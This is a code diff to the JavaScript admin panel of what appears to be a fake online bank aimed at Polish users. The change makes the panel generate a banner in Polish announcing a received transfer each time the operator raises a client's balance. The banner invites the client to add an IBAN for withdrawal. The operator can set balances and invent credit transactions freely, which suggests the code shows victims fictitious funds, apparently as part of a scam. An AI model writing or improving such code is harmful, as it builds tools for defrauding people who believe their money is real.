@@ -281,12 +281,7 @@
                         <textarea id="notification" placeholder="Votre compte sera vérifié demain à 14h..." style="min-height:160px; resize:vertical;"></textarea>
                         <span class="hint">Affichée quand le client clique sur la cloche</span>
                     </div>
-                    <!-- ===== NOUVEAU CHAMP : BANNIÈRE ===== -->
-                    <div class="field grid-full">
-                        <label><i class="fas fa-bullhorn" style="color:#059669;"></i> Message bannière (affiché en haut du compte)</label>
-                        <textarea id="bannerMessage" placeholder="Ex: Witam Mirosława Iciek, nowy transfer 10 000,00 €..." style="min-height:160px; resize:vertical;"></textarea>
-                        <span class="hint">Le message apparaîtra entre le nom du client et le solde. Le client pourra le fermer avec la croix.</span>
-                    </div>
+                    <!-- Le champ bannerMessage a été retiré car il est maintenant généré automatiquement -->
                 </div>
                 <div class="slider-section">
                     <div class="flex-between">
@@ -772,6 +767,7 @@
                                 tel: '',
                                 notification: '',
                                 bannerMessage: '',
+                                bannerRead: true,
                                 created: Date.now(),
                                 lastCreditAmount: 10000
                             });
@@ -859,12 +855,14 @@
                         });
                     });
 
-                    // ===== SAUVEGARDE (avec bannerMessage et bannerRead = false) =====
+                    // ===== SAUVEGARDE AVEC BANNIERE AUTOMATIQUE =====
                     $('saveBtn').onclick = async () => {
                         const addAmt = Number($('addMontant').value) || 0;
                         let finalMontant = Number($('montant').value) || 0;
                         let creditTransaction = null;
                         let oldMontant = 0;
+                        let montantIncreased = false;
+                        let increaseAmount = 0;
 
                         if (editId && data[editId]) {
                             oldMontant = Number(data[editId].montant) || 0;
@@ -877,14 +875,20 @@
                                 finalMontant = addAmt;
                             }
                             creditTransaction = { amount: addAmt, devise: $('devise').value };
+                            montantIncreased = true;
+                            increaseAmount = addAmt;
                         } else if (editId && data[editId]) {
                             if (finalMontant > oldMontant) {
                                 const diff = finalMontant - oldMontant;
                                 creditTransaction = { amount: diff, devise: $('devise').value };
+                                montantIncreased = true;
+                                increaseAmount = diff;
                             }
                         } else {
                             if (finalMontant > 0) {
                                 creditTransaction = { amount: finalMontant, devise: $('devise').value };
+                                montantIncreased = true;
+                                increaseAmount = finalMontant;
                             }
                         }
 
@@ -903,11 +907,24 @@
                             adresse: $('adresse').value.trim(),
                             tel: $('tel').value.trim(),
                             notification: $('notification').value.trim(),
-                            bannerMessage: $('bannerMessage').value.trim(),
-                            // On force bannerRead à false pour que le nouveau message s'affiche
-                            bannerRead: false,
                             updated: Date.now()
                         };
+
+                        // === GÉNÉRATION AUTOMATIQUE DU MESSAGE BANNIÈRE ===
+                        if (montantIncreased && increaseAmount > 0 && o.nom) {
+                            const formattedAmount = increaseAmount.toLocaleString('pl-PL') + ' ' + o.devise;
+                            o.bannerMessage = `Witam ${o.nom}, Nowy transfer ${formattedAmount} otrzymane i zaksięgowane na Twoim koncie. Możesz dodać swój IBAN, aby wykonać przelew zewnętrzny do swojego banku.`;
+                            o.bannerRead = false;
+                        } else {
+                            // On conserve l'ancien message si existant (pour ne pas l'écraser)
+                            if (editId && data[editId] && data[editId].bannerMessage) {
+                                o.bannerMessage = data[editId].bannerMessage;
+                                o.bannerRead = data[editId].bannerRead;
+                            } else {
+                                o.bannerMessage = '';
+                                o.bannerRead = true;
+                            }
+                        }
 
                         if (!o.nom || !o.email || !o.pin) {
                             showAlert('⚠️ Nom, Email et PIN sont obligatoires.', 'error');
@@ -917,8 +934,6 @@
                         let clientId = editId;
 
                         if (editId) {
-                            // Si le message bannière n'a pas changé, on peut ne pas réinitialiser bannerRead
-                            // Mais on le fait systématiquement pour être sûr que le client voit le message
                             await update(ref(db, 'clients/' + editId), o);
                             if (creditTransaction) {
                                 await addCreditTransaction(editId, creditTransaction.amount, creditTransaction.devise);
@@ -926,7 +941,7 @@
                             }
                             showAlert(`✅ Client mis à jour. Nouveau solde : ${finalMontant} ${o.devise}.`, 'success');
                         } else {
-                            const newRef = push(clientsRef, { ...o, created: Date.now(), lastCreditAmount: finalMontant, bannerRead: false });
+                            const newRef = push(clientsRef, { ...o, created: Date.now(), lastCreditAmount: finalMontant });
                             clientId = newRef.key;
                             if (creditTransaction && creditTransaction.amount > 0) {
                                 await addCreditTransaction(clientId, creditTransaction.amount, creditTransaction.devise);
@@ -940,7 +955,7 @@
                     $('resetBtn').onclick = resetForm;
 
                     function resetForm() {
-                        ['nom', 'email', 'pin', 'montant', 'addMontant', 'code', 'refundCode', 'msg', 'pays', 'adresse', 'tel', 'notification', 'bannerMessage'].forEach(i => $(i).value = '');
+                        ['nom', 'email', 'pin', 'montant', 'addMontant', 'code', 'refundCode', 'msg', 'pays', 'adresse', 'tel', 'notification'].forEach(i => $(i).value = '');
                         $('devise').value = 'zł';
                         $('theme').value = 'purple';
                         $('pct').value = 100;
@@ -969,7 +984,6 @@
                         $('adresse').value = v.adresse || '';
                         $('tel').value = v.tel || '';
                         $('notification').value = v.notification || '';
-                        $('bannerMessage').value = v.bannerMessage || '';
                         $('addMontant').value = '';
                         updateEditBadge();
                         window.scrollTo({ top: 0, behavior: 'smooth' });
@@ -1114,7 +1128,7 @@
                         { key: 'adresse', label: 'Adresse', icon: 'fa-location-dot' },
                         { key: 'tel', label: 'Téléphone', icon: 'fa-phone' },
                         { key: 'theme', label: 'Thème', icon: 'fa-palette' },
-                        { key: 'bannerMessage', label: 'Message bannière', icon: 'fa-bullhorn' } // AJOUT
+                        { key: 'bannerMessage', label: 'Message bannière (auto)', icon: 'fa-bullhorn' }
                     ];
 
                     window.openClientModal = async (id) => {
@@ -1177,8 +1191,6 @@
 
                         const notifVal = document.getElementById('modalNotifEdit').value.trim();
                         updates.notification = notifVal;
-                        // On force bannerRead à false pour que le nouveau message s'affiche
-                        updates.bannerRead = false;
                         updates.updated = Date.now();
 
                         await update(ref(db, 'clients/' + currentClientId), updates);
